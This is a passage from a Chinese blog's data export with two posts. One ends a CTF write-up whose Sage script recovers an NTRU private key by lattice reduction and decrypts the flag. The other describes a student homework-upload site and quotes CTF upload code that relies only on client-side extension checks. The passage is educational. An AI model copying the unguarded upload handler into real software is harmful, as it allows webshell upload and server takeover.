\\cdots &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; q<br>\\end{array}<br>\\right)<br>$$<br>具体可以参考这篇 Paper: <a href=\"https://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.578.5423&amp;rep=rep1&amp;type=pdf\">https://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.578.5423&amp;rep=rep1&amp;type=pdf</a><br>取 $\\lambda=1$ ，规约后最短向量即为 $[f\\enspace g]$ ，然后就可以计算私钥解密了。<br>exp 如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\">start = time.time()</span><br><span class=\"line\">Zx.&lt;x&gt; = ZZ[]</span><br><span class=\"line\">n = <span class=\"number\">109</span> </span><br><span class=\"line\">q = <span class=\"number\">2048</span></span><br><span class=\"line\">p = <span class=\"number\">3</span></span><br><span class=\"line\">Df = <span class=\"number\">9</span></span><br><span class=\"line\">Dg = <span class=\"number\">10</span></span><br><span class=\"line\">Dr = <span class=\"number\">11</span></span><br><span class=\"line\">h=<span class=\"number\">510</span>*x^<span class=\"number\">108</span> - <span class=\"number\">840</span>*x^<span class=\"number\">107</span> - <span class=\"number\">926</span>*x^<span class=\"number\">106</span> - <span class=\"number\">717</span>*x^<span class=\"number\">105</span> - <span class=\"number\">374</span>*x^<span class=\"number\">104</span> - <span class=\"number\">986</span>*x^<span class=\"number\">103</span> + <span class=\"number\">488</span>*x^<span class=\"number\">102</span> + <span class=\"number\">119</span>*x^<span class=\"number\">101</span> - <span class=\"number\">247</span>*x^<span class=\"number\">100</span> + <span class=\"number\">34</span>*x^<span class=\"number\">99</span> + <span class=\"number\">751</span>*x^<span class=\"number\">98</span> - <span class=\"number\">44</span>*x^<span class=\"number\">97</span> - <span class=\"number\">257</span>*x^<span class=\"number\">96</span> - <span class=\"number\">749</span>*x^<span class=\"number\">95</span> + <span class=\"number\">648</span>*x^<span class=\"number\">94</span> - <span class=\"number\">280</span>*x^<span class=\"number\">93</span> - <span class=\"number\">585</span>*x^<span class=\"number\">92</span> - <span class=\"number\">347</span>*x^<span class=\"number\">91</span> + <span class=\"number\">357</span>*x^<span class=\"number\">90</span> - <span class=\"number\">451</span>*x^<span class=\"number\">89</span> - <span class=\"number\">15</span>*x^<span class=\"number\">88</span> + <span class=\"number\">638</span>*x^<span class=\"number\">87</span> - <span class=\"number\">624</span>*x^<span class=\"number\">86</span> - <span class=\"number\">458</span>*x^<span class=\"number\">85</span> + <span class=\"number\">216</span>*x^<span class=\"number\">84</span> + <span class=\"number\">36</span>*x^<span class=\"number\">83</span> - <span class=\"number\">199</span>*x^<span class=\"number\">82</span> - <span class=\"number\">655</span>*x^<span class=\"number\">81</span> + <span class=\"number\">258</span>*x^<span class=\"number\">80</span> + <span class=\"number\">845</span>*x^<span class=\"number\">79</span> + <span class=\"number\">490</span>*x^<span class=\"number\">78</span> - <span class=\"number\">272</span>*x^<span class=\"number\">77</span> + <span class=\"number\">279</span>*x^<span class=\"number\">76</span> + <span class=\"number\">101</span>*x^<span class=\"number\">75</span> - <span class=\"number\">580</span>*x^<span class=\"number\">74</span> - <span class=\"number\">461</span>*x^<span class=\"number\">73</span> - <span class=\"number\">614</span>*x^<span class=\"number\">72</span> - <span class=\"number\">171</span>*x^<span class=\"number\">71</span> - <span class=\"number\">1012</span>*x^<span class=\"number\">70</span> + <span class=\"number\">71</span>*x^<span class=\"number\">69</span> - <span class=\"number\">579</span>*x^<span class=\"number\">68</span> + <span class=\"number\">290</span>*x^<span class=\"number\">67</span> + <span class=\"number\">597</span>*x^<span class=\"number\">66</span> + <span class=\"number\">841</span>*x^<span class=\"number\">65</span> + <span class=\"number\">35</span>*x^<span class=\"number\">64</span> - <span class=\"number\">545</span>*x^<span class=\"number\">63</span> + <span class=\"number\">575</span>*x^<span class=\"number\">62</span> - <span class=\"number\">665</span>*x^<span class=\"number\">61</span> + <span class=\"number\">304</span>*x^<span class=\"number\">60</span> - <span class=\"number\">900</span>*x^<span class=\"number\">59</span> + <span class=\"number\">428</span>*x^<span class=\"number\">58</span> - <span class=\"number\">992</span>*x^<span class=\"number\">57</span> - <span class=\"number\">241</span>*x^<span class=\"number\">56</span> + <span class=\"number\">953</span>*x^<span class=\"number\">55</span> - <span class=\"number\">784</span>*x^<span class=\"number\">54</span> - <span class=\"number\">730</span>*x^<span class=\"number\">53</span> - <span class=\"number\">317</span>*x^<span class=\"number\">52</span> + <span class=\"number\">108</span>*x^<span class=\"number\">51</span> + <span class=\"number\">180</span>*x^<span class=\"number\">50</span> - <span class=\"number\">881</span>*x^<span class=\"number\">49</span> - <span class=\"number\">943</span>*x^<span class=\"number\">48</span> + <span class=\"number\">413</span>*x^<span class=\"number\">47</span> - <span class=\"number\">898</span>*x^<span class=\"number\">46</span> + <span class=\"number\">453</span>*x^<span class=\"number\">45</span> - <span class=\"number\">407</span>*x^<span class=\"number\">44</span> + <span class=\"number\">153</span>*x^<span class=\"number\">43</span> - <span class=\"number\">932</span>*x^<span class=\"number\">42</span> + <span class=\"number\">262</span>*x^<span class=\"number\">41</span> + <span class=\"number\">874</span>*x^<span class=\"number\">40</span> - <span class=\"number\">7</span>*x^<span class=\"number\">39</span> - <span class=\"number\">364</span>*x^<span class=\"number\">38</span> + <span class=\"number\">98</span>*x^<span class=\"number\">37</span> - <span class=\"number\">130</span>*x^<span class=\"number\">36</span> + <span class=\"number\">942</span>*x^<span class=\"number\">35</span> - <span class=\"number\">845</span>*x^<span class=\"number\">34</span> - <span class=\"number\">890</span>*x^<span class=\"number\">33</span> + <span class=\"number\">558</span>*x^<span class=\"number\">32</span> - <span class=\"number\">791</span>*x^<span class=\"number\">31</span> - <span class=\"number\">654</span>*x^<span class=\"number\">30</span> - <span class=\"number\">733</span>*x^<span class=\"number\">29</span> - <span class=\"number\">171</span>*x^<span class=\"number\">28</span> - <span class=\"number\">182</span>*x^<span class=\"number\">27</span> + <span class=\"number\">644</span>*x^<span class=\"number\">26</span> - <span class=\"number\">18</span>*x^<span class=\"number\">25</span> + <span class=\"number\">776</span>*x^<span class=\"number\">24</span> + <span class=\"number\">845</span>*x^<span class=\"number\">23</span> - <span class=\"number\">675</span>*x^<span class=\"number\">22</span> - <span class=\"number\">741</span>*x^<span class=\"number\">21</span> - <span class=\"number\">352</span>*x^<span class=\"number\">20</span> - <span class=\"number\">143</span>*x^<span class=\"number\">19</span> - <span class=\"number\">351</span>*x^<span class=\"number\">18</span> - <span class=\"number\">158</span>*x^<span class=\"number\">17</span> + <span class=\"number\">671</span>*x^<span class=\"number\">16</span> + <span class=\"number\">609</span>*x^<span class=\"number\">15</span> - <span class=\"number\">34</span>*x^<span class=\"number\">14</span> + <span class=\"number\">811</span>*x^<span class=\"number\">13</span> - <span class=\"number\">674</span>*x^<span class=\"number\">12</span> + <span class=\"number\">595</span>*x^<span class=\"number\">11</span> - <span class=\"number\">1005</span>*x^<span class=\"number\">10</span> + <span class=\"number\">855</span>*x^<span class=\"number\">9</span> + <span class=\"number\">831</span>*x^<span class=\"number\">8</span> + <span class=\"number\">768</span>*x^<span class=\"number\">7</span> + <span class=\"number\">133</span>*x^<span class=\"number\">6</span> - <span class=\"number\">436</span>*x^<span class=\"number\">5</span> + <span class=\"number\">1016</span>*x^<span class=\"number\">4</span> + <span class=\"number\">403</span>*x^<span class=\"number\">3</span> + <span class=\"number\">904</span>*x^<span class=\"number\">2</span> + <span class=\"number\">874</span>*x + <span class=\"number\">248</span></span><br><span class=\"line\">e=-<span class=\"number\">453</span>*x^<span class=\"number\">108</span> - <span class=\"number\">304</span>*x^<span class=\"number\">107</span> - <span class=\"number\">380</span>*x^<span class=\"number\">106</span> - <span class=\"number\">7</span>*x^<span class=\"number\">105</span> - <span class=\"number\">657</span>*x^<span class=\"number\">104</span> - <span class=\"number\">988</span>*x^<span class=\"number\">103</span> + <span class=\"number\">219</span>*x^<span class=\"number\">102</span> - <span class=\"number\">167</span>*x^<span class=\"number\">101</span> - <span class=\"number\">473</span>*x^<span class=\"number\">100</span> + <span class=\"number\">63</span>*x^<span class=\"number\">99</span> - <span class=\"number\">60</span>*x^<span class=\"number\">98</span> + <span class=\"number\">1014</span>*x^<span class=\"number\">97</span> - <span class=\"number\">874</span>*x^<span class=\"number\">96</span> - <span class=\"number\">846</span>*x^<span class=\"number\">95</span> + <span class=\"number\">604</span>*x^<span class=\"number\">94</span> - <span class=\"number\">649</span>*x^<span class=\"number\">93</span> + <span class=\"number\">18</span>*x^<span class=\"number\">92</span> - <span class=\"number\">458</span>*x^<span class=\"number\">91</span> + <span class=\"number\">689</span>*x^<span class=\"number\">90</span> + <span class=\"number\">80</span>*x^<span class=\"number\">89</span> - <span class=\"number\">439</span>*x^<span class=\"number\">88</span> + <span class=\"number\">968</span>*x^<span class=\"number\">87</span> - <span class=\"number\">834</span>*x^<span class=\"number\">86</span> - <span class=\"number\">967</span>*x^<span class=\"number\">85</span> - <span class=\"number\">784</span>*x^<span class=\"number\">84</span> + <span class=\"number\">496</span>*x^<span class=\"number\">83</span> - <span class=\"number\">883</span>*x^<span class=\"number\">82</span> + <span class=\"number\">971</span>*x^<span class=\"number\">81</span> - <span class=\"number\">242</span>*x^<span class=\"number\">80</span> + <span class=\"number\">956</span>*x^<span class=\"number\">79</span> - <span class=\"number\">832</span>*x^<span class=\"number\">78</span> - <span class=\"number\">587</span>*x^<span class=\"number\">77</span> + <span class=\"number\">525</span>*x^<span class=\"number\">76</span> + <span class=\"number\">87</span>*x^<span class=\"number\">75</span> + <span class=\"number\">464</span>*x^<span class=\"number\">74</span> + <span class=\"number\">661</span>*x^<span class=\"number\">73</span> - <span class=\"number\">36</span>*x^<span class=\"number\">72</span> - <span class=\"number\">14</span>*x^<span class=\"number\">71</span> + <span class=\"number\">940</span>*x^<span class=\"number\">70</span> - <span class=\"number\">16</span>*x^<span class=\"number\">69</span> - <span class=\"number\">277</span>*x^<span class=\"number\">68</span> + <span class=\"number\">899</span>*x^<span class=\"number\">67</span> - <span class=\"number\">390</span>*x^<span class=\"number\">66</span> + <span class=\"number\">441</span>*x^<span class=\"number\">65</span> + <span class=\"number\">246</span>*x^<span class=\"number\">64</span> + <span class=\"number\">267</span>*x^<span class=\"number\">63</span> - <span class=\"number\">395</span>*x^<span class=\"number\">62</span> + <span class=\"number\">185</span>*x^<span class=\"number\">61</span> + <span class=\"number\">221</span>*x^<span class=\"number\">60</span> + <span class=\"number\">466</span>*x^<span class=\"number\">59</span> + <span class=\"number\">249</span>*x^<span class=\"number\">58</span> + <span class=\"number\">813</span>*x^<span class=\"number\">57</span> + <span class=\"number\">116</span>*x^<span class=\"number\">56</span> - <span class=\"number\">100</span>*x^<span class=\"number\">55</span> + <span class=\"number\">109</span>*x^<span class=\"number\">54</span> + <span class=\"number\">579</span>*x^<span class=\"number\">53</span> + <span class=\"number\">151</span>*x^<span class=\"number\">52</span> + <span class=\"number\">194</span>*x^<span class=\"number\">51</span> + <span class=\"number\">364</span>*x^<span class=\"number\">50</span> - <span class=\"number\">413</span>*x^<span class=\"number\">49</span> + <span class=\"number\">614</span>*x^<span class=\"number\">48</span> + <span class=\"number\">367</span>*x^<span class=\"number\">47</span> + <span class=\"number\">758</span>*x^<span class=\"number\">46</span> + <span class=\"number\">460</span>*x^<span class=\"number\">45</span> + <span class=\"number\">162</span>*x^<span class=\"number\">44</span> + <span class=\"number\">837</span>*x^<span class=\"number\">43</span> + <span class=\"number\">903</span>*x^<span class=\"number\">42</span> + <span class=\"number\">896</span>*x^<span class=\"number\">41</span> - <span class=\"number\">747</span>*x^<span class=\"number\">40</span> + <span class=\"number\">410</span>*x^<span class=\"number\">39</span> - <span class=\"number\">928</span>*x^<span class=\"number\">38</span> - <span class=\"number\">230</span>*x^<span class=\"number\">37</span> + <span class=\"number\">465</span>*x^<span class=\"number\">36</span> - <span class=\"number\">496</span>*x^<span class=\"number\">35</span> - <span class=\"number\">568</span>*x^<span class=\"number\">34</span> + <span class=\"number\">30</span>*x^<span class=\"number\">33</span> - <span class=\"number\">158</span>*x^<span class=\"number\">32</span> + <span class=\"number\">687</span>*x^<span class=\"number\">31</span> - <span class=\"number\">284</span>*x^<span class=\"number\">30</span> + <span class=\"number\">794</span>*x^<span class=\"number\">29</span> - <span class=\"number\">606</span>*x^<span class=\"number\">28</span> + <span class=\"number\">705</span>*x^<span class=\"number\">27</span> - <span class=\"number\">37</span>*x^<span class=\"number\">26</span> + <span class=\"number\">926</span>*x^<span class=\"number\">25</span> - <span class=\"number\">602</span>*x^<span class=\"number\">24</span> - <span class=\"number\">442</span>*x^<span class=\"number\">23</span> - <span class=\"number\">523</span>*x^<span class=\"number\">22</span> - <span class=\"number\">260</span>*x^<span class=\"number\">21</span> + <span class=\"number\">530</span>*x^<span class=\"number\">20</span> - <span class=\"number\">796</span>*x^<span class=\"number\">19</span> + <span class=\"number\">443</span>*x^<span class=\"number\">18</span> + <span class=\"number\">902</span>*x^<span class=\"number\">17</span> - <span class=\"number\">210</span>*x^<span class=\"number\">16</span> + <span class=\"number\">926</span>*x^<span class=\"number\">15</span> + <span class=\"number\">785</span>*x^<span class=\"number\">14</span> + <span class=\"number\">440</span>*x^<span class=\"number\">13</span> - <span class=\"number\">572</span>*x^<span class=\"number\">12</span> - <span class=\"number\">268</span>*x^<span class=\"number\">11</span> - <span class=\"number\">217</span>*x^<span class=\"number\">10</span> + <span class=\"number\">26</span>*x^<span class=\"number\">9</span> + <span class=\"number\">866</span>*x^<span class=\"number\">8</span> + <span class=\"number\">19</span>*x^<span class=\"number\">7</span> + <span class=\"number\">778</span>*x^<span class=\"number\">6</span> + <span class=\"number\">923</span>*x^<span class=\"number\">5</span> - <span class=\"number\">197</span>*x^<span class=\"number\">4</span> - <span class=\"number\">446</span>*x^<span class=\"number\">3</span> - <span class=\"number\">202</span>*x^<span class=\"number\">2</span> - <span class=\"number\">353</span>*x - <span class=\"number\">852</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mul</span>(<span class=\"params\">f,g</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (f * g) % (x^n-<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decrypt</span>(<span class=\"params\">pri_key,e</span>):</span><br><span class=\"line\">    f,fp = pri_key</span><br><span class=\"line\">    a = bal_mod(mul(f,e),q)</span><br><span class=\"line\">    b = bal_mod(mul(a,fp),p)</span><br><span class=\"line\">    pt = <span class=\"string\">&#x27;&#x27;</span>.join([<span class=\"built_in\">str</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> b.<span class=\"built_in\">list</span>()])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> pt</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bal_mod</span>(<span class=\"params\">f,q</span>):</span><br><span class=\"line\">    g = <span class=\"built_in\">list</span>(((f[i] + q//<span class=\"number\">2</span>) % q) - q//<span class=\"number\">2</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Zx(g)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">lattice</span>(<span class=\"params\">h,q</span>):</span><br><span class=\"line\">    n = <span class=\"number\">109</span></span><br><span class=\"line\">    <span class=\"comment\"># h = bal_mod(683*h,q)</span></span><br><span class=\"line\">    grid = Matrix(ZZ,<span class=\"number\">2</span>*n,<span class=\"number\">2</span>*n)</span><br><span class=\"line\">    cof = h.<span class=\"built_in\">list</span>()</span><br><span class=\"line\">    offset = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>*n):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>*n):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> i&lt;n:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> j &lt; n:</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> i==j:</span><br><span class=\"line\">                        grid[i,j] = <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    grid[i,j] = cof[(j-n-offset)%n]</span><br><span class=\"line\">            <span class=\"keyword\">elif</span> j&gt;=n <span class=\"keyword\">and</span> i==j:</span><br><span class=\"line\">                grid[i,j] = q</span><br><span class=\"line\">        offset += <span class=\"number\">1</span></span><br><span class=\"line\">    GL = grid.BKZ()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> GL,grid</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inv_mod_prime</span>(<span class=\"params\">f,p</span>):</span><br><span class=\"line\">    T = Zx.change_ring(Integers(p)).quotient(x^n-<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Zx(lift(<span class=\"number\">1</span> / T(f)))</span><br><span class=\"line\"></span><br><span class=\"line\">GL,grid = lattice(h,q)</span><br><span class=\"line\">SVP = <span class=\"built_in\">list</span>(GL[<span class=\"number\">0</span>])</span><br><span class=\"line\">f = Zx(SVP[:n])</span><br><span class=\"line\">g = Zx(SVP[-n:])</span><br><span class=\"line\">a = bal_mod(mul(f,e),q)</span><br><span class=\"line\">fp = inv_mod_prime(f,p)</span><br><span class=\"line\">pv = (f,fp)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(decrypt(pv,e))</span><br><span class=\"line\">flag = <span class=\"built_in\">int</span>(decrypt(pv,e)+<span class=\"string\">&#x27;0&#x27;</span>*<span class=\"number\">6</span>,<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(long_to_bytes(flag))</span><br><span class=\"line\"></span><br><span class=\"line\">end = time.time()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(end-start)</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"勘误\"><a href=\"#勘误\" class=\"headerlink\" title=\"勘误\"></a>勘误</h2><p>维基百科中说 $m$ 转化成系数在 $[-p/2,p/2]$ 间多项式，实际应为 ${-1,0,1}$ 间。<br>代码中加密函数原为<code>return balancedmod(convolution(public_key,p*r) + message,q)</code>，一般版本中的公钥是没乘 $p$ 的，在加密中才乘，但这里公钥已经乘过 $p$ 了，就可以删去。实测不删去也可正常解密，推测应该是在后面取模时消去了，读者可自行推导。</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://en.wikipedia.org/wiki/NTRUEncrypt\">https://en.wikipedia.org/wiki/NTRUEncrypt</a><br><a href=\"https://github.com/joannawetesko/NTRU-cryptosystem/blob/master/NTRU.sage\">https://github.com/joannawetesko/NTRU-cryptosystem/blob/master/NTRU.sage</a><br><a href=\"https://blog.csdn.net/sinat_36742186/article/details/83689529\">https://blog.csdn.net/sinat_36742186/article/details/83689529</a></p>"},{"title":"一个简单的作业提交平台","date":"2021-12-19T14:00:00.000Z","_content":"\n这个项目大概是上星期五晚开始做的，之所以现在才写这篇文，纯粹是因为没有时间，刚好今早把高数写完了， CAD 又不想动，于是便借此时间简单总结一下。\n<!--more-->\n首先写这个网站的起因是邮箱发作业实在是过于麻烦，看着隔壁广州计算机的都用着 Matrix（一个我们大学学生运维的 OJ ，即在线判题平台），一点提交就有结果，而我们交作业却是原始的上交源文件和运行截图，我也无何办法，谁让我们是材料计算机呢（并无歧视材料的意思，只是单纯地憎恶化学，高中本就没选）。等我和课代表商量的时候，他也表示早已被不按规则提交的作业搞得苦不堪言（乐），想了想，虽然费劲写个小破站有些浪费时间，与大卷之势相悖，但毕竟也算有点意思，便做了下去。\n\n********************************\n\n## 开始\n\n最初的文件是直接抄中国人民公安大学的一道信安题的，代码附上：\n\n```php\nheader(\"Content-type: text/html;charset=utf-8\");\nerror_reporting(0);\n//设置上传目录\ndefine(\"UPLOAD_PATH\", dirname(__FILE__) . \"/upload/\");\n// define(\"UPLOAD_URL_PATH\", str_replace($_SERVER['DOCUMENT_ROOT'], \"\", UPLOAD_PATH));\nif (!file_exists(UPLOAD_PATH)) {\n    mkdir(UPLOAD_PATH, 0755);\n}\nif (!empty($_POST['submit'])) {\n    if (!$_FILES['file']['size']) {\n        echo \"<script>alert('请添加上传文件')</script>\";\n    } else {\n        $name = basename($_FILES['file']['name']);\n        if (move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_PATH . $name)) {\n            echo \"<script>alert('上传成功')</script>\";\n            echo \"上传文件相对路径<br>\" . \"/upload/\" . $name;\n        } else {\n            echo \"<script>alert('上传失败')</script>\";\n        }\n    }\n}\n$myfile = fopen(\"log.txt\", \"a\") or die(\"Unable to open file!\");\n            fwrite($myfile,$_SERVER[\"REMOTE_ADDR\"]);\n            $txt=\"\\n\";\n            fwrite($myfile,$txt);\n            fclose($myfile);\n?>\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>PPSUC 文件上传 - js前端验证</title>\n</head>\n<body>\n    <h1>PPSUC 文件上传 - js前端验证</h1>\n    <p>本题从PPSUC窃取得来</p>\n    <form action=\"\" method=\"post\" enctype=\"multipart/form-data\" onsubmit=\"return checkfilesuffix()\">\n        <label for=\"file\">Filename:</label>\n        <input type=\"file\" name=\"file\" id=\"file\" />\n        <br />\n        <input type=\"submit\" name=\"submit\" value=\"Submit\" />\n    </form>\n<script>\nfunction checkfilesuffix()\n{\n    var file=document.getElementsByName('file')[0]['value'];\n    if(file==\"\"||file==null)\n    {\n        alert(\"请添加上传文件\");\n        return false;\n    }\n    else\n    {\n        var whitelist=new Array(\".jpg\",\".png\",\".gif\");\n        var file_suffix=file.substring(file.lastIndexOf(\".\"));\n        if(whitelist.indexOf(file_suffix) == -1)\n        {\n            alert(\":(该文件不允许上传:(\");\n            return false;\n        }\n    }\n}\n</script>\n</body>\n</html>\n```\n\n这题考的是 JS 前端验证的绕过，解出题后的我深知前端验证的不可靠，便知道敏感的操作限制应该加在后端了。但毕竟前端也得有点拦一下不是，否则累死后端不说，代码冗杂也是一个问题。上百度抄一抄，后端的后缀限制也完成了（解释一下，之所以限制文件后缀，一方面是因为提交的文件格式问题，一方面是安全问题，假若给你上传了一个 php 木马而我又没加限制访问的情况下， RCE 就是件很简单的事情了，之后你可以查看和操作任意权限允许的文件，总之是很危险的事）。\n在完成后缀的限制后，我又加了如下的诸多验证：\n\n**文件大小非空且大小须小于512KB(后来改成了666KB)** ：否则给你当网盘使那我服务器也是难顶，而且源文件最大也没什么可能超过 10 KB，截图预计也是几十 KB\n**upload目录的访问限制**：可不能给随便偷了作业看\n**姓名不能为空且不多于4个字**：这个问过课代表，我们班的名字没有超过 3 个字的\n**学号范围**：086-199 ，但有一个人的学号孤悬在外，有些奇怪（乐）\n**姓名和学号的联合验证**：这个是前两天才加上去的，主要是忘了之前的军事课有份名单（但是那位竟然是没有的，再处理吧）\n\n## 后端处理逻辑重构\n\n一开始我是设置先新建（姓名+学号）的一个目录，再逐个文件进行判断，若符合条件则放进目录里，但这就会引发一个问题，如果有文件不符合条件的话目录仍会存在，而为了防止有意或是无意的重复上传导致原文件被覆盖，我又设置了若目录已存在则不能继续放文件,于是我在上机课的时候改成了先全部验证通过再上传目录。\n\n## 管理员端\n\n毕竟作业也不是我收的，如果每次都要我来登录服务器下载未免也太过麻烦，于是我抄了段多级目录压缩的代码，在管理员通过验证后将提交上的作业打包成了个 zip ，再存储于基于 SHA256 算法生成的时间哈希值命名的目录中，这样大概便无法被直接扫描出来了。\n管理员的登录验证我采用的是RSA公钥加密出的一段 base64 编码的字符串，若在后端用私钥解密后得到明文\"admin\"便通过验证，但想了想似乎没必要用非对称加密，有空再改。\n除此之外，我还加了个验证码，但是在 Firefox 上似乎不能正常刷新，于是就没加在学生端了。\n\n## 前端的样式\n\n这个是我最无奈的地方，个人的美术功底着实是捞得亚匹，布局和配色搞得乱七八糟，在此就希望同学多多与我反馈了。\n\n## 一些问题\n\n### 开源\n\n本来打算上传到 github 的，但是还没处理好重要文件的放置（总不能学号和姓名也开源不是）。\n\n>_更新：项目已发布于_\n_<https://github.com/weyung/A-simple-homework-submission-platform>_\n\n### JQuery\n\n说来有些可笑，我一开始是用原生 Javescript 写的前端，代码繁琐且在使用 ajax 的时候被异步坑了一把：我写了一个函数调用后端的接口然后 return 数据，却发现主函数中得到的结果总是 undefined ，后来才知道是先 return 再接收数据，晕。而用 JQuery 一个回调函数就搞定了，虽然 JQuery 似乎的确有些过时，但有空再看 React、Vue 什么的吧。\n\n### SSH\n\n之前是想用 VSCode 写代码的，但是 SSH 一直显示什么管道不存在，直到今晚才瞎搞接通了。用宝塔的在线文本编辑器写了一个星期的代码，现在终于能有舒服点的高亮了。至于调试也是个问题，因为懒得搭本地环境，我至今还是肉眼调试，有空也得处理下。\n","source":"_posts/一个简单的作业提交平台.md","raw":"---\ntitle: 一个简单的作业提交平台\ndate: 2021-12-19 22:00:00\ntags: PHP\ncategories: 小项目\n---\n\n这个项目大概是上星期五晚开始做的，之所以现在才写这篇文，纯粹是因为没有时间，刚好今早把高数写完了， CAD 又不想动，于是便借此时间简单总结一下。\n<!--more-->\n首先写这个网站的起因是邮箱发作业实在是过于麻烦，看着隔壁广州计算机的都用着 Matrix（一个我们大学学生运维的 OJ ，即在线判题平台），一点提交就有结果，而我们交作业却是原始的上交源文件和运行截图，我也无何办法，谁让我们是材料计算机呢（并无歧视材料的意思，只是单纯地憎恶化学，高中本就没选）。等我和课代表商量的时候，他也表示早已被不按规则提交的作业搞得苦不堪言（乐），想了想，虽然费劲写个小破站有些浪费时间，与大卷之势相悖，但毕竟也算有点意思，便做了下去。\n\n********************************\n\n## 开始\n\n最初的文件是直接抄中国人民公安大学的一道信安题的，代码附上：\n\n```php\nheader(\"Content-type: text/html;charset=utf-8\");\nerror_reporting(0);\n//设置上传目录\ndefine(\"UPLOAD_PATH\", dirname(__FILE__) . \"/upload/\");\n// define(\"UPLOAD_URL_PATH\", str_replace($_SERVER['DOCUMENT_ROOT'], \"\", UPLOAD_PATH));\nif (!file_exists(UPLOAD_PATH)) {\n    mkdir(UPLOAD_PATH, 0755);\n}\nif (!empty($_POST['submit'])) {\n    if (!$_FILES['file']['size']) {\n        echo \"<script>alert('请添加上传文件')</script>\";\n    } else {\n        $name = basename($_FILES['file']['name']);\n        if (move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_PATH . $name)) {\n            echo \"<script>alert('上传成功')</script>\";\n            echo \"上传文件相对路径<br>\" . \"/upload/\" . $name;\n        } else {\n            echo \"<script>alert('上传失败')</script>\";\n        }\n    }\n}\n$myfile = fopen(\"log.txt\", \"a\") or die(\"Unable to open file!\");\n            fwrite($myfile,$_SERVER[\"REMOTE_ADDR\"]);\n            $txt=\"\\n\";\n            fwrite($myfile,$txt);\n            fclose($myfile);\n?>\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>PPSUC 文件上传 - js前端验证</title>\n</head>\n<body>\n    <h1>PPSUC 文件上传 - js前端验证</h1>\n    <p>本题从PPSUC窃取得来</p>\n    <form action=\"\" method=\"post\" enctype=\"multipart/form-data\" onsubmit=\"return checkfilesuffix()\">\n        <label for=\"file\">Filename:</label>\n        <input type=\"file\" name=\"file\" id=\"file\" />\n        <br />\n        <input type=\"submit\" name=\"submit\" value=\"Submit\" />\n    </form>\n<script>\nfunction checkfilesuffix()\n{\n    var file=document.getElementsByName('file')[0]['value'];\n    